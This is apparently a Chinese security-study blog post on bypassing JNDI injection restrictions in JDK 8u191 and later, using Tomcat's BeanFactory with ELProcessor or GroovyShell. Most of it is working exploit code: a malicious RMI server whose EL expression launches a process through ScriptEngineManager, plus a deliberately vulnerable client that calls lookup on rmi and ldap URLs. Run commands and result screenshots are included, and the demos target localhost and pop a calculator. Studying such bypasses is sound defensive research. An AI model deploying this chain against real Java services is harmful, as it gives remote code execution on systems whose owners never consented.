+++
title = "JNDI攻击（jdk 8u191 以上）"
date = 2026-06-14T22:15:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 前情


jdk 8u191以上   无论  rmi  还是 lookup 

都是false 意味着受害者jvm 拒绝从任何 远程服务器下载.class 恶意文件

但是jndi 的lookuo()机制没有变  不能远程下载   可以利用受害者本地CLassPath 现有的，可信的类进行漏洞触发


衍生了两条高版本的jndi绕过路线

1.本地工厂类  （BeanFactory 绕过）-》不依赖原生反序列化


2.ldap纯反序列化  （本地Gadget触发）-》依赖本地反序列化触发链


## 本地工厂类  （以Tomcat  的 BeanFactory为例）



### rmi服务端

源码

RMIServerBeanFactory.java

```java
package com.jndi;

  

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import org.apache.naming.factory.BeanFactory;

  

import javax.naming.Reference;

import javax.naming.StringRefAddr;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

  

/**

 * 高版本 JDK 绕过 - RMI 服务器（BeanFactory + ELProcessor）

 *

 * 原理：

 * 1. JDK 6u132, 6u141, 7u131, 8u121 之后，RMI 远程加载 Factory 类被限制

 * 2. 但如果 Factory 类在受害者本地 ClassPath 中存在，JVM 依然会实例化它

 * 3. Tomcat 的 BeanFactory 在很多 Spring Boot 应用中存在

 * 4. BeanFactory 允许通过 forceString 属性，反射调用任意类的任意方法

 *

 * 攻击链：

 *   受害者 lookup("rmi://127.0.0.1:1099/Exploit")

 *   → RMI 服务器返回 Reference(className="javax.el.ELProcessor", factory="org.apache.naming.factory.BeanFactory")

 *   → 受害者本地加载 BeanFactory

 *   → BeanFactory 根据 forceString 属性，调用 ELProcessor.eval()

 *   → 执行 EL 表达式 → RCE

 */

public class RMIServerBeanFactory {

  

    private static final int RMI_PORT = 1099;

  

    public static void main(String[] args) throws Exception {

        System.out.println("========== 高版本 JDK 绕过 - RMI 服务器 ==========");

        System.out.println("攻击方式: Tomcat BeanFactory + ELProcessor");

        System.out.println("监听端口: " + RMI_PORT);

        System.out.println("适用版本: JDK 8u121+ / JDK 11+ (需要 Tomcat 依赖)");

        System.out.println();

  

        // 创建 RMI 注册表

        Registry registry = LocateRegistry.createRegistry(RMI_PORT);

  

        // ========== 方式1: 使用 ELProcessor 执行 EL 表达式 ==========

        Reference ref1 = new Reference("javax.el.ELProcessor", BeanFactory.class.getName(), null);

  

        // forceString 属性: x=eval 表示将属性 x 映射为调用 eval() 方法

        ref1.add(new StringRefAddr("forceString", "x=eval"));

  

        // EL 表达式：通过 ScriptEngineManager 执行 JavaScript 代码

        // 这里演示弹出计算器（Windows: calc，Linux/Mac: open /Applications/Calculator.app）

        String elExpression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")";

        ref1.add(new StringRefAddr("x", elExpression));

  

        ReferenceWrapper wrapper1 = new ReferenceWrapper(ref1);

        registry.bind("Exploit", wrapper1);

  

        System.out.println("[+] 已绑定: rmi://127.0.0.1:" + RMI_PORT + "/Exploit");

        System.out.println("[+] 目标类: javax.el.ELProcessor");

        System.out.println("[+] 工厂类: org.apache.naming.factory.BeanFactory");

        System.out.println("[+] 攻击方法: ELProcessor.eval()");

        System.out.println();

        System.out.println("等待受害者 lookup...");

  

        // 保持服务运行

        Thread.currentThread().join();

    }

}
```


启动rmi 服务器

mvn exec:java '-Dexec.mainClass=com.jndi.RMIServerBeanFactory'




![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528173957472.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528174008859.png)





### 启动受害者服务端

VictimClient.java


```java
package com.jndi;

  

import javax.naming.InitialContext;

import java.util.Scanner;

  

/**

 * 高版本 JDK 绕过 - 受害者客户端

 *

 * 模拟存在 JNDI 注入漏洞的应用程序

 * 在高版本 JDK 中，即使有 trustURLCodebase 限制，依然可以被 BeanFactory 绕过

 *

 * 前提条件：

 * 1. 受害者 ClassPath 中存在 Tomcat 依赖（如 Spring Boot 内置 Tomcat）

 * 2. 存在 javax.el.ELProcessor 或 groovy.lang.GroovyShell

 */

public class VictimClient {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========== 高版本 JDK 绕过 - 受害者客户端 ==========");

        System.out.println("Java 版本: " + System.getProperty("java.version"));

        System.out.println();

  

        Scanner scanner = new Scanner(System.in);

  

        System.out.println("请选择攻击方式：");

        System.out.println("1. RMI + BeanFactory + ELProcessor");

        System.out.println("2. LDAP + BeanFactory + ELProcessor");

        System.out.println("3. RMI + BeanFactory + GroovyShell");

        System.out.println("4. LDAP + BeanFactory + GroovyShell");

        System.out.print("请输入选项 (1-4): ");

  

        String choice = scanner.nextLine().trim();

        String jndiName = "";

  

        switch (choice) {

            case "1":

                jndiName = "rmi://127.0.0.1:1099/Exploit";

                break;

            case "2":

                jndiName = "ldap://127.0.0.1:1389/Exploit";

                break;

            case "3":

                jndiName = "rmi://127.0.0.1:1099/Groovy";

                break;

            case "4":

                jndiName = "ldap://127.0.0.1:1389/Groovy";

                break;

            default:

                System.out.println("无效选项，使用默认: rmi://127.0.0.1:1099/Exploit");

                jndiName = "rmi://127.0.0.1:1099/Exploit";

        }

  

        System.out.println();

        System.out.println("[受害者] 执行 ctx.lookup(\"" + jndiName + "\")");

        System.out.println("[受害者] 注意：此操作将触发远程代码执行！");

        System.out.println();

  

        InitialContext ctx = new InitialContext();

        ctx.lookup(jndiName);

  

        System.out.println("[受害者] lookup 返回");

    }

}
```



开始启动受害者 客户端

mvn exec:java '-Dexec.mainClass=com.jndi.VictimClient'


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528181056459.png)


### 选择方式   


### 1.RMI + BeanFactory + ELProcessor

依赖这个  ELProcessor   来进行

但是这个没有成功  因为不是原生的服务




### 2.LDAP + BeanFactory + GroovyShell


### 启动 LDAP 服务器

  mvn exec:java '-Dexec.mainClass=com.jndi.LDAPServerGroovy'

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528191233297.png)


### 启动受害者客户端

  mvn exec:java '-Dexec.mainClass=com.jndi.VictimClient'


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528191322497.png)


然后输入选项4进行   就能够弹出计算机了


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260528200528052.png)




r-
